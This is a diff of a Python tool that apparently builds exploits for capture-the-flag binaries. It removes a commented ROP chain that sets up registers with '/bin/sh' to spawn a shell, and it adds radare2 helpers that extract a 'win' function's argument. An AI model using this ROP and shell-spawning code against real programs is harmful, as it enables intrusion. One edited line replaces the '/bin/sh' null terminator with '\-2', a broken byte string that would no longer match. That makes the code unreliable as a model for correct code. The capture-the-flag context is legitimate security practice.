@@ -49,32 +49,8 @@ class our_rop:
             if 'syscall' in i:
                 return int(i.split(':')[0], 16)
         return None
-
-        
-
-
-
-'''
-
-# populate arg1 - rdi
-chain += p64((rop.find_gadget(['pop rdi', 'ret']))[0])
-chain += p64(next(elf.search(b'/bin/sh\x00')))
-
-# populate arg2 - rsi
-chain += p64((rop.find_gadget(['pop rsi', 'ret']))[0])
-chain += p64(0)
-
-# populate arg3 - rdx
-#chain += p64((rop.find_gadget(['pop rdx', 'ret']))[0])
-# 0x00000000004007c0: pop rdx; pop r11; pop r8; ret;
-
-chain += p64(0x00000000004007c0)
-chain += p64(0)*3
-
-'''
-
-
-
+    def satisfy_win(s):
+        return s.fill_reg('rdi', analyze.get_win_arg())
 
         
 
@@ -142,11 +118,17 @@ class analyze:
     
     def has_rop(s):
         return any((match := re.compile(r'gadget*').match(i)) for i in s.functions)
+
+    def win_has_args(s):
+        if s.has_win():
+            return '' != s.r2.cmd('pdf @ sym.win | grep cmp')
+        return False
+
     
     # get stuff
     def get_binsh(s):
           if s.has_binsh():
-            return next(s.elf.search(b'/bin/sh\0'))
+            return next(s.elf.search(b'/bin/sh\-2'))
           else:
             return None
     
@@ -179,6 +161,10 @@ class analyze:
         except:
             return None
     
+    def get_win_arg(s):
+        val = s.r2.cmd('pdf @ sym.win | grep cmp | awk \'{print $NF}\'')
+        return int(val,16) if val != '' else None
+
 
     def has_leak(s):
         io = process(s.binary)
